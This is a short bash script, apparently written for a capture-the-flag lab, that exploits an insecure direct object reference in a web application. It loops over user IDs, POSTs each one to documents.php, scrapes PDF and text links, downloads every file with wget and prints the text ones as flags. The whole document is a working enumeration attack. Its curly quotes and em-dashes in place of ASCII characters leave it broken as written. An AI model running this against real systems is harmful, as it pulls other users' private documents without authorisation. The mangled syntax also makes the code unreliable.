#!/usr/bin/env bash

url=”http://IP TARGET:PORT"

echo “IDOR enumeration, POST request method”

for i in {1..20}; do

echo “ → uid $i”

# POST and extract links, then process line-by-line (safe for spaces/chars)

curl -sS -X POST — data “uid=$i” “$url/documents.php” \

| grep -oP ‘/documents/[^’\’’]*\.(pdf|txt)’ \

| sort -u \

| while IFS= read -r link; do

# If link is empty, skip to the next iteration

[[ -z “$link” ]] && continue

echo “ Found: $link”

file_url=”${url}${link}”

# download and check success

if wget -q — content-disposition -c “$file_url”; then

filename=$(basename “$link”)

# if it’s a .txt file open it

if [[ “$filename” == *.txt && -f “$filename” ]]; then

echo “flag: $filename”

sed -n ‘1,200p’ “$filename”

fi

else

echo “ [!] wget failed for: $file_url” >&2

fi

done

done
